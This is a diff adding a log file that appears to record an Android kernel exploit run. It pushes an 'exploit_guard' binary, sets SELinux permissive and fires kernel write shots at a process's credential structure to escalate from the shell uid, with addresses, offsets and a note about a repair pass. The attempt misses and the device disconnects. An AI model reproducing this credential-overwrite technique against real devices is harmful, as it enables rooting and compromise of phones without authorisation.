@@ -1,0 +1,52 @@
+[06:24:26] === preflight ===
+5.10.236-android12-9-o-gaf2075ad2c06
+Enforcing
+70b3233e-cadf-496d-a4a8-a04f45af5d5f
+ 06:24:31 up 1 min,  0 users,  load average: 34.43, 14.37, 5.27
+34.43 14.37 5.27 2/8419 14555
+[06:24:32]   clearing leftover glx* from previous runs:
+    remaining: 0
+./exploit_guard: 1 file pushed, 0 skipped. 19.9 MB/s (73008 bytes in 0.003s)
+./exploit_guard: 1 file pushed, 0 skipped. 10.9 MB/s (73008 bytes in 0.006s)
+[06:24:40] === step 1: SELinux Permissive ===
+[06:25:45]   W1 round 1: Permissive
+[06:25:46] === step 2: host-side kernel log (dmesg poll, deduped by timestamp) ===
+[06:25:48]   /dev/kmsg NOT readable (expected here) — polling dmesg from the host
+[06:25:58]   klog lines after 5s: 0
+[06:25:59] === step 3: load settle (max 15s, threshold 16) ===
+[06:26:02]   load1=161.09
+[06:26:11]   load1=148.43
+[06:26:18]   load1=126.07
+[06:26:25]   load1=116.22
+[06:26:34]   load1=98.81
+[06:26:42]   load1=91.14
+[06:26:51]   load1=77.83
+[06:26:56] === step 4: LT child (pure userspace spin, NO_EXEC) ===
+[06:29:06]   LT attempt 1 rejected: [31m[-] [0mperf task suspicious (addr=0xffffffc03592beb0 votes=48/256) — reject
+[06:29:37]   task=0xffffff8871281280 child_pid=30488 lt_parent=28487
+[06:29:40]   baseline: Uid: 2000 2000 2000 2000
+[06:29:41] === step 5: 0x778 shot(s) (real_cred) ===
+[06:29:43]   [w778r1] ONE shot: off=0x778 chainwait=6000ms hold=20s nodrain=1 
+[06:30:21]   [w778r1] shot wall-clock: 36s
+    W7[W7] write value = private cred page 0xffffff8826c22de0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff8826c22de0
+    W7[W7] write_target= 0xffffff88712819f8
+    probe_state    = R
+    probe_done     = 0
+    ✗ W7[W7] miss (probe_state=R)
+    W7[W7] PIN child 7011 holds the payload page 20s; writer returns now
+[06:30:30]   [w778r1] probe_state=R  (D=landed, R=miss, S=blocked)
+[06:31:11]   [w778] round 1/2: readback unchanged
+[06:31:16]   [w778r2] ONE shot: off=0x778 chainwait=6000ms hold=20s nodrain=1 
+error: closed
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device still authorizing
